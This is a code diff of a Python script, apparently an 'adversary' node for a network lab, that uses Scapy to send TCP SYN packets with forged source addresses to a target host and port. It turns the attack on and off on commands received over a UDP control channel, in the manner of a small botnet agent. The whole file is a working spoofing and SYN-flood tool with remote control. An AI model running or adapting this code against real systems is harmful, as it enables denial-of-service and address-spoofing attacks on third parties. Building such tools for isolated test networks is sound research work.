@@ -4,40 +4,86 @@ import socket
 import threading
 import random
 import time
+import json
 
-CONTROL_HOST = "10.10.0.1"
+# --- Configuration ---
+# IP of the machine running the controller script
+CONTROL_HOST = "127.0.0.1" 
 CONTROL_PORT = 9000
-SERVER_IP = "10.10.0.2"
-SERVER_PORT = 8080
 
+# The target for the spoofed packets
+TARGET_IP = "10.10.0.2"
+TARGET_PORT = 8080
+# --- End Configuration ---
+
+# Global flag to control the attack thread's state
 running = False
 
 def spoof_attack():
+    """
+    This function runs in a separate thread. When the 'running' flag is True,
+    it continuously sends spoofed TCP SYN packets to the target.
+    """
     while True:
         if running:
-            spoof_ip = f"10.10.1.{random.randint(2,254)}"
-            pkt = IP(src=spoof_ip, dst=SERVER_IP) / TCP(dport=SERVER_PORT, sport=random.randint(1024,65535), flags="S")
-            send(pkt, verbose=False)
-            print(f"[*] Sent spoofed packet from {spoof_ip}")
-            time.sleep(1)
+            # Generate a random source IP from a different subnet
+            spoof_ip = f"10.10.1.{random.randint(2, 254)}"
+            
+            # Craft the packet using Scapy
+            packet = IP(src=spoof_ip, dst=TARGET_IP) / TCP(dport=TARGET_PORT, sport=random.randint(1024, 65535), flags="S")
+            
+            # Send the packet without printing Scapy's default output
+            send(packet, verbose=False)
+            
+            print(f"[*] Sent spoofed packet from {spoof_ip} to {TARGET_IP}:{TARGET_PORT}")
+            time.sleep(1)  # Wait for 1 second before sending the next packet
         else:
+            # If the attack is stopped, sleep to prevent a high-CPU wait loop
             time.sleep(1)
 
-def listener():
+def control_listener():
+    """
+    Listens for commands from the controller to start/stop the attack.
+    """
     global running
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((CONTROL_HOST, CONTROL_PORT))
+    
+    # 1. Create a UDP socket to communicate with the controller
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    server_address = (CONTROL_HOST, CONTROL_PORT)
+
+    # 2. Announce presence to the controller by sending a "join" packet
+    join_packet = {"type": "join", "role": "adversary"}
+    sock.sendto(json.dumps(join_packet).encode('utf-8'), server_address)
+    print(f"[*] Adversary node has joined the controller at {CONTROL_HOST}:{CONTROL_PORT}")
+
+    # 3. Listen indefinitely for commands
     while True:
-        data = s.recv(1024).decode()
-        if not data:
+        try:
+            # Wait to receive data from the controller
+            data, _ = sock.recvfrom(1024) 
+            
+            # Decode the received JSON packet
+            packet = json.loads(data.decode('utf-8'))
+            command = packet.get("type")
+
+            # 4. Check the command and update the 'running' state
+            if command == "start" and not running:
+                running = True
+                print("\n[+] Received START command. Adversary attack initiated.")
+            elif command == "stop" and running:
+                running = False
+                print("\n[-] Received STOP command. Adversary attack halted.")
+
+        except (json.JSONDecodeError, UnicodeDecodeError):
+            print("[!] Warning: Received a malformed packet from the controller.")
+        except Exception as e:
+            print(f"[!] An error occurred in the listener: {e}")
             break
-        if data == "START":
-            running = True
-            print("[*] Adversary attack started")
-        elif data == "STOP":
-            running = False
-            print("[*] Adversary attack stopped")
 
 if __name__ == "__main__":
-    threading.Thread(target=spoof_attack, daemon=True).start()
-    listener()
+    # Start the attack function in a background thread
+    attack_thread = threading.Thread(target=spoof_attack, daemon=True)
+    attack_thread.start()
+
+    # Start the main listener function to wait for controller commands
+    control_listener()
